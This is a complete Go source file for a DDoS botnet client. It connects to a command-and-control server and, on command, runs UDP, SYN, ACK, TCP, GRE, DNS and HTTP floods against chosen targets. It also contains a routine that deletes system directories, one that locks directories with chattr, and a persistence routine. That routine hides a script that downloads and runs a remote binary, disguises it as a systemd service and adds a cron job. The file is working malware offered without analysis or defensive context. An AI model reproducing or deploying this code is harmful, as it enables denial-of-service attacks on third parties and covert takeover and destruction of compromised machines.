package main

import (
	"bufio"
	"bytes"
	"context"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/miekg/dns"
)

const serverAddr = "Replace IP:7002"

var (
	retryDelay  = 5 * time.Second
	workers     = 2024
	killEnabled = false
	killPaths   = []string{"/tmp", "/var/run", "/mnt", "/root", "/etc/config", "/data", "/var/lib/", "/sys", "/proc", "/var/cache", "/usr/tmp", "/var/cache", "/var/tmp"}
	safePaths   = []string{"/var/run/lock", "/var/run/shm", "/etc", "/usr/local", "/var/lib", "/boot", "/lib", "/lib64"}
)

func main() {
	for {
		c, err := net.Dial("tcp", serverAddr)
		if err != nil {
			fmt.Printf("dial err: %v\n", err)
			time.Sleep(retryDelay)
			continue
		}
		fmt.Println("Connected to C2 server. Listening for commands...")
		rd := bufio.NewReader(c)
		for {
			line, err := rd.ReadString('\n')
			if err != nil {
				if err == io.EOF {
					fmt.Println("Connection closed by server. Reconnecting...")
					break
				}
				fmt.Printf("read err: %v\n", err)
				break
			}
			line = strings.TrimSpace(line)
			if err := dispatch(line); err != nil {
				fmt.Printf("dispatch err: %v\n", err)
			}
		}
		c.Close()
		fmt.Println("Retrying connection to C2 server...")
		time.Sleep(retryDelay)
	}
}

func dispatch(raw string) error {
	f := strings.Fields(raw)
	if len(f) == 0 {
		return fmt.Errorf("empty command")
	}
	cmd := f[0]
	if cmd == "PING" {
		fmt.Println("PONG")
		return nil
	}

	methods := map[string]bool{
		"!udpflood": true, "!udpsmart": true, "!tcpflood": true, "!synflood": true,
		"!ackflood": true, "!greflood": true, "!dns": true, "!http": true,
	}
	if methods[cmd] {
		if len(f) != 4 {
			return fmt.Errorf("bad format for %s", cmd)
		}
		host := f[1]
		port, err := strconv.Atoi(f[2])
		if err != nil {
			return fmt.Errorf("bad port: %w", err)
		}
		secs, err := strconv.Atoi(f[3])
		if err != nil {
			return fmt.Errorf("bad duration: %w", err)
		}
		switch cmd {
		case "!udpflood":
			go udpBlast(host, port, secs)
		case "!udpsmart":
			go udpRandBlast(host, port, secs)
		case "!tcpflood":
			go tcpBlast(host, port, secs)
		case "!synflood":
			go synBlast(host, port, secs)
		case "!ackflood":
			go ackBlast(host, port, secs)
		case "!greflood":
			go greBlast(host, secs)
		case "!dns":
			go dnsBlast(host, port, secs)
		case "!http":
			go httpBlast(host, port, secs)
		}
		return nil
	}

	switch cmd {
	case "!kill":
		cleanDirs()
	case "!lock":
		lockDirs()
	case "!persist":
		persist()
	default:
		return fmt.Errorf("unknown cmd: %s", cmd)
	}
	return nil
}

type dnsAnswer struct {
	Answer []struct {
		Data string `json:"data"`
	} `json:"Answer"`
}

func resolve(host string) (string, error) {
	if net.ParseIP(host) != nil {
		return host, nil
	}
	u := fmt.Sprintf("https://1.1.1.1/dns-query?name=%s&type=A", host)
	req, err := http.NewRequest("GET", u, nil)
	if err != nil {
		return "", fmt.Errorf("req err: %v", err)
	}
	req.Header.Set("Accept", "application/dns-json")
	resp, err := (&http.Client{}).Do(req)
	if err != nil {
		return "", fmt.Errorf("doh err: %v", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		return "", fmt.Errorf("doh status %d", resp.StatusCode)
	}
	var ans dnsAnswer
	if err := json.NewDecoder(resp.Body).Decode(&ans); err != nil {
		return "", fmt.Errorf("decode err: %v", err)
	}
	if len(ans.Answer) == 0 {
		return "", fmt.Errorf("no records for %s", host)
	}
	return ans.Answer[0].Data, nil
}

func httpBlast(host string, port, secs int) {
	rand.Seed(time.Now().UnixNano())
	fmt.Printf("Starting HTTP flood on %s:%d for %d seconds\n", host, port, secs)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()

	var sent int64
	var wg sync.WaitGroup

	ip, err := resolve(host)
	if err != nil {
		fmt.Printf("resolve failed: %v\n", err)
		return
	}
	target := fmt.Sprintf("http://%s:%d", ip, port)

	uas := []string{
		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36",
		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Safari/537.36",
		"Mozilla/5.0 (Linux; Android 11; SM-G996B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Mobile Safari/537.36",
		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
		"Mozilla/5.0 (Linux; Android 10; Pixel 4 XL Build/QP1A.190821.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
	}
	refs := []string{
		"https://www.google.com/",
		"https://www.example.com/",
		"https://www.wikipedia.org/",
		"https://www.reddit.com/",
		"https://www.github.com/",
	}
	langs := []string{"en-US,en;q=0.9", "fr-FR,fr;q=0.9", "es-ES,es;q=0.9", "de-DE,de;q=0.9"}

	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			cl := &http.Client{}
			body := make([]byte, 1024)
			for {
				select {
				case <-ctx.Done():
					return
				default:
					req, err := http.NewRequest("POST", target, bytes.NewReader(body))
					if err != nil {
						continue
					}
					req.Header.Set("User-Agent", uas[rand.Intn(len(uas))])
					req.Header.Set("Referer", refs[rand.Intn(len(refs))])
					req.Header.Set("Accept-Language", langs[rand.Intn(len(langs))])
					req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
					if resp, err := cl.Do(req); err == nil {
						resp.Body.Close()
					}
					atomic.AddInt64(&sent, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("HTTP flood done. Sent: %d\n", atomic.LoadInt64(&sent))
}

func udpRandBlast(ip string, port, secs int) {
	rand.Seed(time.Now().UnixNano())
	fmt.Printf("Starting randomized UDP flood on %s:%d for %d seconds\n", ip, port, secs)
	dst := net.ParseIP(ip)
	if dst == nil {
		fmt.Printf("bad ip: %s\n", ip)
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	var cnt int64
	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sock, err := net.ListenPacket("udp", ":0")
			if err != nil {
				fmt.Printf("listen err: %v\n", err)
				return
			}
			defer sock.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					sz := rand.Intn(10000) + 25400
					data := make([]byte, sz)
					rand.Read(data)
					sp := rand.Intn(65535-1024) + 1024
					sock.WriteTo(data, &net.UDPAddr{IP: dst, Port: port, Zone: fmt.Sprintf("%d", sp)})
					atomic.AddInt64(&cnt, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("UDP flood done. Sent: %d\n", atomic.LoadInt64(&cnt))
}

func udpBlast(ip string, port, secs int) {
	fmt.Printf("Starting UDP flood on %s:%d for %d seconds\n", ip, port, secs)
	dst := net.ParseIP(ip)
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	var cnt int64
	var wg sync.WaitGroup
	payload := make([]byte, 65507)
	rand.Read(payload)
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					sp := rand.Intn(65535-1024) + 1024
					conn, err := net.DialUDP("udp", &net.UDPAddr{Port: sp}, &net.UDPAddr{IP: dst, Port: port})
					if err != nil {
						continue
					}
					if _, err = conn.Write(payload); err == nil {
						atomic.AddInt64(&cnt, 1)
					}
					conn.Close()
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("UDP flood done. Sent: %d\n", cnt)
}

func dnsBlast(ip string, port, secs int) {
	fmt.Printf("Starting DNS flood on %s:%d for %d seconds\n", ip, port, secs)
	dst := net.ParseIP(ip)
	if dst == nil {
		fmt.Printf("bad ip: %s\n", ip)
		return
	}
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	var cnt int64
	var wg sync.WaitGroup
	domains := []string{"youtube.com", "google.com", "spotify.com", "neflix.com", "bing.com", "facebok.com", "amazom.com"}
	qtypes := []uint16{dns.TypeA, dns.TypeAAAA, dns.TypeMX, dns.TypeNS}
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sock, err := net.ListenPacket("udp", ":0")
			if err != nil {
				return
			}
			defer sock.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					d := domains[rand.Intn(len(domains))]
					qt := qtypes[rand.Intn(len(qtypes))]
					q := buildQuery(d, qt)
					buf, err := q.Pack()
					if err != nil {
						continue
					}
					sp := rand.Intn(65535-1024) + 1024
					sock.WriteTo(buf, &net.UDPAddr{IP: dst, Port: port, Zone: fmt.Sprintf("%d", sp)})
					atomic.AddInt64(&cnt, 1)
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("DNS flood done. Sent: %d\n", atomic.LoadInt64(&cnt))
}

func tcpBlast(ip string, port, secs int) {
	rand.Seed(time.Now().UnixNano())
	dst := net.ParseIP(ip)
	if dst == nil {
		fmt.Println("bad ip")
		return
	}
	var cnt int64
	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sock, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer sock.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcp := &layers.TCP{
						SrcPort: layers.TCPPort(rand.Intn(52024) + 1024), DstPort: layers.TCPPort(port),
						Seq: rand.Uint32(), Window: 12800, SYN: true, DataOffset: 5,
					}
					pld := make([]byte, 65535-40)
					rand.Read(pld)
					sbuf := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(sbuf, gopacket.SerializeOptions{}, tcp, gopacket.Payload(pld)); err != nil {
						continue
					}
					if _, err := sock.WriteTo(sbuf.Bytes(), &net.IPAddr{IP: dst}); err == nil {
						atomic.AddInt64(&cnt, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("TCP flood done. Sent: %d\n", cnt)
}

func synBlast(ip string, port, secs int) {
	rand.Seed(time.Now().UnixNano())
	dst := net.ParseIP(ip)
	if dst == nil {
		fmt.Println("bad ip")
		return
	}
	var cnt int64
	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sock, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer sock.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcp := &layers.TCP{
						SrcPort: layers.TCPPort(rand.Intn(52024) + 1024), DstPort: layers.TCPPort(port),
						Seq: rand.Uint32(), Window: 12800, SYN: true, DataOffset: 5,
					}
					pld := make([]byte, 65535-40)
					rand.Read(pld)
					sbuf := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(sbuf, gopacket.SerializeOptions{}, tcp, gopacket.Payload(pld)); err != nil {
						continue
					}
					if _, err := sock.WriteTo(sbuf.Bytes(), &net.IPAddr{IP: dst}); err == nil {
						atomic.AddInt64(&cnt, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("SYN flood done. Sent: %d\n", cnt)
}

func ackBlast(ip string, port int, secs int) error {
	rand.Seed(time.Now().UnixNano())
	dst := net.ParseIP(ip)
	if dst == nil {
		return fmt.Errorf("bad ip: %s", ip)
	}
	var cnt int64
	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sock, err := net.ListenPacket("ip4:tcp", "0.0.0.0")
			if err != nil {
				return
			}
			defer sock.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					tcp := &layers.TCP{
						SrcPort: layers.TCPPort(rand.Intn(64312) + 1024), DstPort: layers.TCPPort(port),
						ACK: true, Seq: rand.Uint32(), Ack: rand.Uint32(), Window: 12800, DataOffset: 5,
					}
					pld := make([]byte, 65535-40)
					rand.Read(pld)
					sbuf := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(sbuf, gopacket.SerializeOptions{}, tcp, gopacket.Payload(pld)); err != nil {
						continue
					}
					if _, err := sock.WriteTo(sbuf.Bytes(), &net.IPAddr{IP: dst}); err == nil {
						atomic.AddInt64(&cnt, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("ACK flood done. Sent: %d\n", atomic.LoadInt64(&cnt))
	return nil
}

func greBlast(ip string, secs int) error {
	rand.Seed(time.Now().UnixNano())
	dst := net.ParseIP(ip)
	if dst == nil {
		return fmt.Errorf("bad ip: %s", ip)
	}
	var cnt int64
	var wg sync.WaitGroup
	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(secs)*time.Second)
	defer cancel()
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			sock, err := net.ListenPacket("ip4:gre", "0.0.0.0")
			if err != nil {
				return
			}
			defer sock.Close()
			for {
				select {
				case <-ctx.Done():
					return
				default:
					gre := &layers.GRE{}
					pld := make([]byte, 65535-24)
					rand.Read(pld)
					sbuf := gopacket.NewSerializeBuffer()
					if err := gopacket.SerializeLayers(sbuf, gopacket.SerializeOptions{}, gre, gopacket.Payload(pld)); err != nil {
						continue
					}
					if _, err := sock.WriteTo(sbuf.Bytes(), &net.IPAddr{IP: dst}); err == nil {
						atomic.AddInt64(&cnt, 1)
					}
				}
			}
		}()
	}
	wg.Wait()
	fmt.Printf("GRE flood done. Sent: %d\n", atomic.LoadInt64(&cnt))
	return nil
}

func buildQuery(domain string, qtype uint16) *dns.Msg {
	m := new(dns.Msg)
	m.SetQuestion(dns.Fqdn(domain), qtype)
	opt := new(dns.OPT)
	opt.Hdr.Name = "."
	opt.Hdr.Rrtype = dns.TypeOPT
	opt.SetUDPSize(4096)
	m.Extra = append(m.Extra, opt)
	return m
}

func cleanDirs() {
	if !killEnabled {
		fmt.Println("Killer disabled.")
		return
	}
	for _, d := range killPaths {
		if isSafe(d) {
			continue
		}
		if err := os.RemoveAll(d); err != nil {
			fmt.Printf("rm %s failed: %v\n", d, err)
		}
	}
}

func isSafe(dir string) bool {
	for _, s := range safePaths {
		if dir == s {
			return true
		}
	}
	return false
}

func lockDirs() {
	for _, d := range killPaths {
		if isSafe(d) {
			continue
		}
		exec.Command("chattr", "+i", d).Run()
	}
}

func persist() {
	base := "/var/lib/.systemd_helper"
	script := filepath.Join(base, ".systemd_script.sh")
	bin := filepath.Join(base, ".systemd_process")
	dl := "http://127.0.0.1/x86"

	if err := os.MkdirAll(base, 0755); err != nil {
		fmt.Printf("mkdir err: %v\n", err)
		return
	}

	sh := fmt.Sprintf(`#!/bin/bash
URL="%s"
PROG="%s"
if [ ! -f "$PROG" ]; then
	wget -O $PROG $URL
	chmod +x $PROG
fi
if ! pgrep -x ".systemd_process" > /dev/null; then
	$PROG &
fi
`, dl, bin)

	if err := os.WriteFile(script, []byte(sh), 0755); err != nil {
		fmt.Printf("write script err: %v\n", err)
		return
	}

	svc := `[Unit]
Description=System Helper Service
After=network.target

[Service]
ExecStart=/var/lib/.systemd_helper/.systemd_script.sh
Restart=always
RestartSec=60
StandardOutput=null
StandardError=null

[Install]
WantedBy=multi-user.target
`
	if err := os.WriteFile("/etc/systemd/system/systemd-helper.service", []byte(svc), 0644); err != nil {
		fmt.Printf("write svc err: %v\n", err)
		return
	}

	exec.Command("systemctl", "enable", "--now", "systemd-helper.service").Run()
	addCron(base)
}

func addCron(dir string) {
	job := fmt.Sprintf(`* * * * * bash %s/.systemd_script.sh > /dev/null 2>&1`, dir)
	exec.Command("bash", "-c", fmt.Sprintf("(crontab -l; echo '%s') | crontab -", job)).Run()
}
